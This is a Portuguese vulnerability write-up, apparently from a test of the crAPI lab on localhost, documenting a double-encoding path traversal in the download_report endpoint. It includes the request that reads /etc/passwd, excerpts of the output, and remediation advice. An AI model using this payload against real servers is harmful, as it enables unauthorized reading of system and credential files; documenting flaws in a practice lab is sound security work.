🇧🇷 Português · [🇺🇸 English](../en/vulnerabilities/12-path-traversal.md)

# Path Traversal / LFI — leitura de arquivos arbitrários sem autenticação

**Categoria OWASP API Security Top 10 (2023):** Path Traversal / LFI — não é categoria isolada no Top 10 de 2023; relaciona-se a validação de entrada e `API8 — Security Misconfiguration`.
**Severidade (CVSS v3.1):** `Alta · 7.5` — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**Desafio crAPI correspondente:** download de relatório com `filename` controlado pelo usuário

---

## 1. Resumo

O endpoint `download_report` (sem autenticação — ver [Acesso não autenticado](11-unauth-access.md)) monta o caminho do arquivo a partir do parâmetro `filename`. Há uma allow-list de caracteres, mas ela é checada **antes** de decodificar a URL (`unquote`). Com **double-encoding** (`%252e` → `%2e` → `.`), o atacante burla a validação e lê **arquivos arbitrários** do servidor (ex.: `/etc/passwd`).

## 2. Pré-condições

- Nenhuma (endpoint não autenticado).

## 3. Passo a passo da exploração

1. Um `filename` simples revela o diretório base e confirma o acesso sem token:

```http
GET /workshop/api/mechanic/download_report?filename=teste HTTP/1.1
Host: localhost:8888
```
→ `404 {"message":"File not found at '/app/reports/teste'."}`

2. `../` codificado uma vez é barrado — o **gateway decodifica antes do Django**, então a validação vê `../` e rejeita (`400 Invalid input`).

3. Com **double-encoding**, o gateway decodifica para `%2e%2e%2f` (que passa na allow-list, pois são `%HH`), e o `unquote` do Django decodifica para `../`:

```http
GET /workshop/api/mechanic/download_report?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1
Host: localhost:8888
```

## 4. Evidência

**Confirmado contra a instância local** — captura em [`evidencias/12-path-traversal/captura.txt`](../../evidencias/12-path-traversal/captura.txt).

```
1) filename=teste                 -> 404  /app/reports/teste         (vaza o caminho base)
2) ../ (single-encoded)           -> 400  Invalid input              (gateway decodifica, validação barra)
3) ../ (DOUBLE-encoded) + etc/passwd -> 200  (conteúdo de /etc/passwd):
   root:x:0:0:root:/root:/bin/sh
   bin:x:1:1:bin:/bin:/sbin/nologin
   daemon:x:2:2:daemon:/sbin:/sbin/nologin
   ...
```

A leitura de `/etc/passwd` **sem autenticação** comprova o path traversal / inclusão de arquivo local (LFI).

## 5. Por que é um risco

Leitura arbitrária de arquivos expõe segredos (chaves, configs, credenciais em arquivos), código-fonte e dados do servidor — frequentemente um passo para comprometimento maior. A causa aqui é um antipadrão clássico: **validar antes de normalizar/decodificar**. A ordem correta é decodificar/normalizar primeiro e validar o resultado final.

## 6. Como corrigir

- **Decodificar/normalizar primeiro, validar depois** — e validar o caminho **resolvido** (`realpath`), garantindo que ele permaneça dentro do diretório permitido.
- Não construir caminhos concatenando entrada do usuário; mapear para um identificador seguro (ex.: id do relatório) em vez de nome de arquivo livre.
- Aplicar autenticação e autorização no endpoint (ver [item 11](11-unauth-access.md)).

## 7. Referências

- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [API8:2023 Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
